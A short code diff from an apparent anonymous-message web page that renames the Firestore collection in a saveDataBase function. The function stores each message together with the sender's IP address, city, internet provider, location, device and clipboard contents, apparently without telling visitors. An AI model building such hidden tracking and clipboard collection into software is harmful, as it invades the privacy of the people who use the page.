@@ -19,7 +19,7 @@ async function sendData() {
 }
 
 async function saveDataBase(waktu, kota, ipAddress, providerInternet, providerOrg, lokasi, lokasiIP, device, clipboard) {
-    db.collection("users").add({
+    db.collection("pesan").add({
         pesan: $('#question').val() + " ",
         waktu: waktu + " ",
 
